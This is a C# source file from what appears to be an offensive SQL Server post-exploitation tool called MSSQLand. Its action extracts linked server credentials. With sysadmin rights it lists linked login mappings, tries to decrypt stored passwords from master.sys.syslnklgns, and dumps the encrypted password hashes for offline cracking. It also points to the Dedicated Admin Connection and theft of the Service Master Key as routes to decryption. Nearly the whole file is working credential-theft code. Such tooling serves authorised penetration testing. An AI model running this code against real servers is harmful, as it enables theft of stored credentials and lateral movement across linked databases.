// MSSQLand/Actions/Remote/LinkCredentials.cs

using MSSQLand.Services;
using MSSQLand.Utilities;
using MSSQLand.Utilities.Formatters;
using System;
using System.Data;

namespace MSSQLand.Actions.Remote
{
    /// <summary>
    /// Attempts to extract linked server credentials.
    /// Requires sysadmin privileges and access to the service master key.
    /// 
    /// Credentials are stored encrypted in master.sys.syslnklgns.
    /// Decryption requires either:
    /// - Running as the SQL Server service account (automatic key access)
    /// - Having the master key password
    /// </summary>
    internal class LinkCredentials : BaseAction
    {
        public override void ValidateArguments(string[] args)
        {
            // No arguments needed
        }

        public override object Execute(DatabaseContext databaseContext)
        {
            // Check if we're sysadmin
            if (!databaseContext.UserService.IsAdmin())
            {
                Logger.Error("Sysadmin privileges required to access linked server credentials.");
                return null;
            }

            Logger.TaskNested("Enumerating linked server login mappings");

            // First, show all linked server login mappings (visible info)
            DataTable mappings = GetLinkedServerMappings(databaseContext);
            
            if (mappings.Rows.Count == 0)
            {
                Logger.Warning("No linked server login mappings found.");
                return null;
            }

            Logger.Success($"Found {mappings.Rows.Count} linked server login mapping(s)");
            Console.WriteLine(OutputFormatter.ConvertDataTable(mappings));

            // Attempt credential extraction using various methods
            Logger.NewLine();
            Logger.Task("Attempting credential extraction");

            // Method 1: Direct decryption (requires service master key access)
            TryDirectDecryption(databaseContext);

            // Method 2: Using DAC connection info
            TryDacInfo(databaseContext);

            return mappings;
        }

        private static DataTable GetLinkedServerMappings(DatabaseContext databaseContext)
        {
            string query = @"
SELECT 
    srv.name AS [LinkedServer],
    srv.provider AS [Provider],
    srv.data_source AS [DataSource],
    CASE 
        WHEN ll.uses_self_credential = 1 THEN 'Self (Impersonation)'
        WHEN ll.local_principal_id = 0 THEN 'Any (Default)'
        ELSE prin.name 
    END AS [LocalLogin],
    ll.remote_name AS [RemoteLogin],
    CASE 
        WHEN ll.uses_self_credential = 1 THEN 'N/A (uses current credentials)'
        WHEN ll.remote_name IS NULL THEN 'No mapping'
        ELSE 'Stored password'
    END AS [CredentialType]
FROM master.sys.servers srv
INNER JOIN master.sys.linked_logins ll 
    ON srv.server_id = ll.server_id
LEFT JOIN master.sys.server_principals prin 
    ON ll.local_principal_id = prin.principal_id
WHERE srv.is_linked = 1
ORDER BY srv.name, prin.name;";

            return databaseContext.QueryService.ExecuteTable(query);
        }

        private static void TryDirectDecryption(DatabaseContext databaseContext)
        {
            Logger.TaskNested("Method 1: Direct decryption via service master key");

            try
            {
                // This query attempts to decrypt linked server passwords
                // It will only work if running in the SQL Server service context
                // or if the SMK is accessible
                string query = @"
SELECT 
    srv.name AS [LinkedServer],
    ll.remote_name AS [RemoteLogin],
    CONVERT(VARCHAR(MAX), 
        DECRYPTBYKEY(ll.pwdhash)
    ) AS [Password]
FROM master.sys.syslnklgns ll
INNER JOIN master.sys.servers srv 
    ON ll.srvid = srv.server_id
WHERE ll.pwdhash IS NOT NULL;";

                DataTable result = databaseContext.QueryService.ExecuteTable(query);

                if (result.Rows.Count > 0)
                {
                    bool foundPassword = false;
                    foreach (DataRow row in result.Rows)
                    {
                        string password = row["Password"]?.ToString();
                        if (!string.IsNullOrEmpty(password))
                        {
                            foundPassword = true;
                            break;
                        }
                    }

                    if (foundPassword)
                    {
                        Logger.Success("Credentials decrypted successfully!");
                        Console.WriteLine(OutputFormatter.ConvertDataTable(result));
                        return;
                    }
                }

                Logger.WarningNested("Direct decryption returned empty - SMK not accessible from this context.");
            }
            catch (Exception ex)
            {
                Logger.WarningNested($"Direct decryption failed: {ex.Message}");
            }
        }

        private static void TryDacInfo(DatabaseContext databaseContext)
        {
            Logger.TaskNested("Method 2: Retrieving encrypted credential info");

            try
            {
                // Get the encrypted password hashes and metadata
                // These can potentially be cracked offline or used with other techniques
                string query = @"
SELECT 
    srv.name AS [LinkedServer],
    srv.provider AS [Provider],
    ll.remote_name AS [RemoteLogin],
    CONVERT(VARCHAR(MAX), ll.pwdhash, 1) AS [EncryptedPasswordHash],
    LEN(ll.pwdhash) AS [HashLength]
FROM master.sys.syslnklgns ll
INNER JOIN master.sys.servers srv 
    ON ll.srvid = srv.server_id
WHERE ll.pwdhash IS NOT NULL
AND ll.remote_name IS NOT NULL;";

                DataTable result = databaseContext.QueryService.ExecuteTable(query);

                if (result.Rows.Count > 0)
                {
                    Logger.InfoNested($"Found {result.Rows.Count} stored credential(s) with encrypted passwords:");
                    Console.WriteLine(OutputFormatter.ConvertDataTable(result));
                    
                    Logger.NewLine();
                    Logger.InfoNested("Decryption options:");
                    Logger.InfoNested("  • DAC (Dedicated Admin Connection) on port 1434");
                    Logger.InfoNested("  • Extract Service Master Key from SQL Server host");
                }
                else
                {
                    Logger.InfoNested("No stored password credentials found (may use Windows auth/impersonation).");
                }
            }
            catch (Exception ex)
            {
                Logger.WarningNested($"Could not retrieve encrypted credentials: {ex.Message}");
            }
        }
    }
}
